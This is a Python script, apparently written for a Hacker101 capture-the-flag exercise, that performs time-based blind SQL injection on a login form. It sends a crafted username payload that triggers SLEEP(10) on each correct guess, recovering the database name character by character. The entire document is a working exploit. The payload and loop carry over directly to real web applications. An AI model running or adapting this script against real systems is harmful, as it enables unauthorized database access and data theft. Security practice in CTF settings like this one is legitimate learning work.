import requests
import time

url = 'https://7612554a11bd0b73251afec62b47523c.ctf.hacker101.com/login'

cookies = {
        "_ga_W62NXF3JMB": "GS2.1.s1749292436$o9$g1$t1749292700$j15$l0$h0",
        "_ga_K45575FWB8": "GS2.1.s1748854158$o2$g0$t1748854158$j60$l0$h0",
        "_ga":	"GA1.1.659219844.1744388181"
}

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": url
}

extracted = ''
charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_'

session = requests.Session()
session.cookies.update(cookies)

for i in range(1, 100):
    for c in charset:
        payload = f"' OR (SELECT CASE WHEN SUBSTRING((SELECT database()),{i},1)='{c}' THEN SLEEP(10) ELSE 0 END) -- -"
        data = {"username": payload, "password": "test"}

        start = time.time()
        requests.post(url, data=data)
        delta = time.time() - start

        if delta > 9:
            extracted += c
            print(f"[+] Found char {i}: {c}")
            break

    else:
        print(f"[!] End of database name")
        break
print(f"Database name: {extracted} length: {len(extracted)}")

